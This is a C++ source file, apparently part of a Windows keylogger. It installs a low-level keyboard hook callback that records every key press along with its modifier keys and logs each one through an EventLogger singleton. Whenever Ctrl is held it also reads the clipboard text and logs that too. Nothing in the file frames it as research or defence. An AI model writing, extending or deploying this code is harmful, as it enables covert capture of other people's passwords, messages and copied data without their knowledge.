#include "KeyboardHandler.h"
#include "EventLogger.h"


boolean checkModifierStatus(const int vkCode) {
    return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
};

void addCombinationModifier(std::string *input) {
    if (checkModifierStatus(VK_CONTROL)) {
        *input += "CTRL + ";
    }
    if (checkModifierStatus(VK_SHIFT)) {
        *input += "SHIFT + ";
    }
    if (checkModifierStatus(VK_MENU)) {
        *input += "ALT + ";
    }
    if (checkModifierStatus(VK_LWIN) || checkModifierStatus(VK_RWIN)) {
        *input += "WIN + ";
    }
}

std::unordered_set<int> pressedKeys;

LRESULT CALLBACK KeyboardCallback(const int nCode, const WPARAM wParam, const WPARAM lParam) {
    const auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        if (pressedKeys.contains(kbStruct->vkCode)) {
            return CallNextHookEx(nullptr, nCode, wParam, lParam);
        }

        pressedKeys.insert(kbStruct->vkCode);

        char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);

        std::string final;
        addCombinationModifier(&final);

        if (checkModifierStatus(VK_CONTROL)) {
            OpenClipboard(nullptr);

            const auto cbHandle = GetClipboardData(CF_TEXT);

            const char* cbHandleText = static_cast<char*>(GlobalLock(cbHandle));
            const std::string text(cbHandleText);
            printf("Clipboard: %s\n", text.c_str());

            GlobalUnlock(cbHandle);
            CloseClipboard();

            std::string cbTextFinal = "Clipboard: " + text;

            EventLogger::getInstance().logEvent(cbTextFinal);
        }

        if (scanCodeMapFI.contains(kbStruct->scanCode)) {
            final += scanCodeMapFI[kbStruct->scanCode];
        }

        printf("%s\n", final.c_str());

        EventLogger::getInstance().logEvent(final);

    } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
        pressedKeys.erase(kbStruct->vkCode);
    }

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}
